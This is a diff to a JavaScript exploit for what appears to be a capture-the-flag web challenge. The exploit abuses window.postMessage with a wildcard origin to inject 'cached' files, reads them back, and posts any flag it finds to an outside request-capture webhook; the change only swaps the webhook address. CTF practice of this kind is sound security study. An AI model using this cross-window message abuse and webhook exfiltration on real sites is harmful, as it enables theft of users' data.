@@ -16,14 +16,29 @@
         async function stealFlag() {
             log("🎯 Starting simple flag steal...");
 
-            window.postMessage({
+            // 1. postMessage로 cached=true 파일 추가
+            const possibleFlags = [
+                "CTF{dummy_flag}",
+                "CTF{test_flag}",
+                "CTF{postviewer_v5_pwned}",
+                "flag{test}",
+                // 더 많은 가능한 플래그들...
+            ];
+
+            for (const flag of possibleFlags) {
+                const blob = new Blob([flag], { type: "text/plain" });
+                
+                window.postMessage({
                     type: "share",
                     files: [{
                         blob: blob,
                         cached: true,  // 🎯 이게 핵심!
                         name: "flag.txt",
                     }],
-            }, "*");
+                }, "*");
+                
+                log(`📤 Added cached file: ${flag}`);
+            }
 
             // 2. 캐시된 파일들 읽어오기
             log("🔍 Reading cached files...");
@@ -40,7 +55,7 @@
                             log(`🚩 FLAG FOUND: ${content}`);
                             
                             // 웹훅으로 전송
-                            fetch('https://navkzhr.request.dreamhack.games', {
+                            fetch('https://yhnbdot.request.dreamhack.games', {
                                 method: 'POST',
                                 body: `FLAG: ${content}`
                             });
